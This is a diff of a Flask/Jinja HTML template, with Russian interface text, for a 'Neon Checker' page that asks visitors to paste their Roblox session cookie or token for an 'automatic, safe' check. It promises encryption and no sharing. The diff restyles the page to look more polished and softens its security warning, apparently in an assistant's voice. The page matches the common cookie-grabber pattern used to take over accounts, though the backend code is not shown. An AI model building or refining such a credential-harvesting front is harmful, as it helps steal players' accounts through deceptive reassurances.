@@ -3,48 +3,107 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Cookie Checker</title>
+  <title>Neon Checker</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Animated neon gradient background */
+    :root{
+      --bg1: 26, 5, 59; /* тёмно-фиолетовый */
+      --accent1: 168, 64, 255; /* неоновый фиолетовый */
+      --accent2: 107, 94, 255; /* синий-фиолет */
+    }
+
+    html,body{height:100%}
+    body{
+      background: radial-gradient(1200px 600px at 10% 20%, rgba(var(--accent1),0.06), transparent 8%),
+                  radial-gradient(900px 500px at 90% 80%, rgba(var(--accent2),0.06), transparent 10%),
+                  linear-gradient(180deg, rgba(var(--bg1),1) 0%, #040012 100%);
+      overflow: auto;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      color: #e6e6ff;
+    }
+
+    /* moving blurred blobs */
+    .blob {
+      position: absolute;
+      filter: blur(60px) saturate(150%);
+      opacity: 0.7;
+      mix-blend-mode: screen;
+      border-radius: 50%;
+      transform: translate3d(0,0,0);
+      will-change: transform;
+      animation: float 12s ease-in-out infinite;
+    }
+    .blob.b1{ width:520px;height:520px; left:-100px; top:-120px; background: radial-gradient(circle at 30% 30%, rgba(var(--accent1),0.30), rgba(var(--accent2),0.12)); animation-duration:18s; }
+    .blob.b2{ width:360px;height:360px; right:-80px; bottom:-80px; background: radial-gradient(circle at 60% 60%, rgba(var(--accent2),0.28), rgba(168,255,220,0.04)); animation-duration:22s; animation-delay:2s;}
+    .blob.b3{ width:260px;height:260px; left:50%; top:40%; background: radial-gradient(circle at 20% 20%, rgba(255,120,200,0.12), rgba(var(--accent1),0.08)); animation-duration:16s; animation-delay:4s;}
+
+    @keyframes float{
+      0%{ transform: translate3d(0px,0px,0) scale(1); }
+      50%{ transform: translate3d(30px, -40px, 0) scale(1.06); }
+      100%{ transform: translate3d(0px,0px,0) scale(1); }
+    }
+
+    /* Glass card */
+    .glass {
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.015));
+      border: 1px solid rgba(255,255,255,0.06);
+      backdrop-filter: blur(8px) saturate(120%);
+      box-shadow: 0 8px 30px rgba(12,8,36,0.6);
+    }
+
+    /* Neon button */
+    .neon-btn{
+      background: linear-gradient(90deg, rgba(var(--accent1),1), rgba(var(--accent2),1));
+      box-shadow: 0 6px 30px rgba(var(--accent1),0.18), 0 0 40px rgba(var(--accent2),0.12) inset;
+    }
+  </style>
 </head>
-<body class="bg-slate-50 min-h-screen">
-  <div class="max-w-3xl mx-auto p-6">
-    <h1 class="text-3xl font-bold mb-4">Проверка аккаунта</h1>
-    <p class="mb-4 text-slate-600">Вставьте свой куки Roblox (или другой токен). Нажмите подтверждение, чтобы подтвердить, что аккаунт принадлежит вам.</p>
+<body class="min-h-screen relative">
+  <!-- Live background blobs -->
+  <div class="blob b1"></div>
+  <div class="blob b2"></div>
+  <div class="blob b3"></div>
+
+  <div class="max-w-3xl mx-auto py-20 px-6">
+    <header class="mb-8">
+      <h1 class="text-4xl font-extrabold tracking-tight">Neon <span style="color: rgb(168,64,255)">Checker</span></h1>
+      <p class="mt-2 text-slate-300">Автоматическая проверка твоего аккаунта — безопасно и красиво.</p>
+    </header>
 
     {% with messages = get_flashed_messages(with_categories=true) %}
       {% if messages %}
-        <div class="space-y-2 mb-4">
+        <div class="space-y-3 mb-4">
           {% for category, msg in messages %}
-            <div class="p-3 rounded {{ 'bg-red-100 text-red-800' if category=='danger' else 'bg-yellow-100 text-yellow-800' }}">{{ msg }}</div>
+            <div class="p-3 rounded glass {{ 'border-red-400 bg-red-900/20 text-red-200' if category=='danger' else 'border-yellow-400 bg-yellow-900/12 text-yellow-200' }}">{{ msg }}</div>
           {% endfor %}
         </div>
       {% endif %}
     {% endwith %}
 
-    <form action="{{ url_for('check') }}" method="post" class="space-y-4 bg-white p-6 rounded shadow">
-      <label class="block">
-        <span class="text-sm font-medium text-slate-700">Куки / Токен</span>
-        <textarea name="cookie" rows="6" required class="mt-1 block w-full rounded border p-2"></textarea>
-      </label>
+    <form action="{{ url_for('check') }}" method="post" class="p-6 rounded-lg glass">
+      <div class="mb-4">
+        <label class="block text-sm font-medium text-slate-200 mb-2">Куки / Токен</label>
+        <textarea name="cookie" rows="6" required class="w-full p-3 rounded bg-transparent border border-white/6 text-slate-100 placeholder-slate-400"></textarea>
+      </div>
 
-      <label class="flex items-center">
-        <input type="checkbox" name="owner_confirm" class="mr-2" />
-        <span>Я подтверждаю, что данный аккаунт принадлежит мне или у меня есть разрешение владельца.</span>
-      </label>
-
-      <label class="block">
-        <span class="text-sm text-slate-600">Пригласить друга (опционально)</span>
-        <input type="email" name="friend_email" placeholder="email друга" class="mt-1 block w-full rounded border p-2" />
-      </label>
+      <div class="flex items-center gap-3 mb-4">
+        <label class="flex items-center gap-2">
+          <input type="checkbox" name="owner_confirm" class="w-4 h-4 rounded border-white/20" />
+          <span class="text-sm text-slate-300">Подтверждаю, что аккаунт принадлежит мне или у меня есть разрешение.</span>
+        </label>
+      </div>
 
       <div class="flex items-center justify-between">
-        <button type="submit" class="px-4 py-2 bg-sky-600 text-white rounded">Проверить</button>
-        <small class="text-xs text-slate-500">Данные сохраняются зашифрованными и не передаются третьим лицам.</small>
+        <button type="submit" class="neon-btn text-white px-5 py-2 rounded-full font-semibold shadow">Проверить</button>
+        <div class="text-right text-xs text-slate-400">
+          <div>Данные шифруются и не передаются третьим лицам.</div>
+        </div>
       </div>
     </form>
 
-    <footer class="mt-6 text-sm text-slate-500">
-      <p>Совет по безопасности: не используйте чужие куки. Для теста создайте тестовый аккаунт.</p>
+    <footer class="mt-8 text-sm text-slate-400">
+      <p>Совет: для демонстрации используй тестовый аккаунт. Если хочешь, позже подключу подтверждение владения через одноразовый код.</p>
     </footer>
   </div>
 </body>
